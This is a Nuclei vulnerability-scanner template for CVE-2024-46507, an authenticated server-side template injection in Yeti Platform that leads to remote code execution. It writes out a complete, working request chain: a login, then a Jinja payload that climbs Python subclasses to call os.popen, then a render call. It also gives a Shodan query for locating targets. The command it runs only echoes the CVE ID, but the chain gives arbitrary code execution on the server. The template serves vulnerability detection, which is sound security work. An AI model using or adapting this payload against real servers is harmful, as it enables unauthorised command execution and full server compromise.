id: CVE-2024-46507

info:
  name: Yeti Platform < 2.1.12 - Authenticated SSTI to Remote Code Execution
  author: iamnoooob,rootxharsh,pdresearch
  severity: high
  description: |
    The Yeti Platform < 2.1.12 contains a Server-Side Template Injection (SSTI) vulnerability that can lead to Remote Code Execution (RCE) when exploited by an authenticated user. Attackers with valid credentials can inject malicious template expressions, which the server evaluates, allowing arbitrary command execution.
  impact: Successful exploitation enables an attacker to execute arbitrary system commands, potentially leading to full server compromise.
  remediation: Upgrade to Yeti Platform 2.1.12 or later to mitigate this vulnerability.
  reference:
    - https://rhinosecuritylabs.com/research/cve-2024-46507-yeti-server-side-template-injection-ssti/
  metadata:
    shodan-query: html:"Yeti</title>"
    verified: true
    max-request: 4
  tags: cve,cve2024,yeti,platform,ssti,rce,intrusive

variables:
  username: "{{username}}"
  password: "{{password}}"

http:
  - raw:
      - |
        POST /api/v2/auth/token HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryodI9qNm7xBZLCq9n

        ------WebKitFormBoundaryodI9qNm7xBZLCq9n
        Content-Disposition: form-data; name="username"

        {{username}}
        ------WebKitFormBoundaryodI9qNm7xBZLCq9n
        Content-Disposition: form-data; name="password"

        {{password}}
        ------WebKitFormBoundaryodI9qNm7xBZLCq9n--

    matchers:
      - type: word
        part: body
        words:
          - access_token
        internal: true

  - raw:
      - |
        POST /api/v2/templates/ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
        Accept: application/json, text/plain, */*
        Content-Type: application/json

        {"template":{"name":"AA","template":"value,tags\n{% for obj in data %}{{obj.value}},{{\";\".join(obj.tags.keys())}}\n{% endfor %}\n\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"echo Q1ZFLTIwMjQtNDY1MDcK | base64 -d\").read()}}{%endif%}{% endfor %}"}}

    skip-variables-check: true

    extractors:
      - type: json
        name: template_id
        internal: true
        json:
          - '.id'
        part: body

  - raw:
      - |
        POST /api/v2/observables/extended HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
        Content-Type: application/json

        {"observable":{"type":"ipv4","value":"1.{{randint(1,255)}}.{{randint(1,255)}}.{{randint(1,255)}}"}}

    extractors:
      - type: json
        name: observable_id
        internal: true
        json:
          - '.id'
        part: body

  - raw:
      - |
        POST /api/v2/templates/render HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"template_id":"{{template_id}}","observable_ids":["{{observable_id}}"],"search_query":""}

    matchers:
      - type: dsl
        dsl:
          - 'contains(content_type, "text/plain")'
          - 'contains(body, "CVE-2024-46507")'
          - 'status_code == 200'
        condition: and
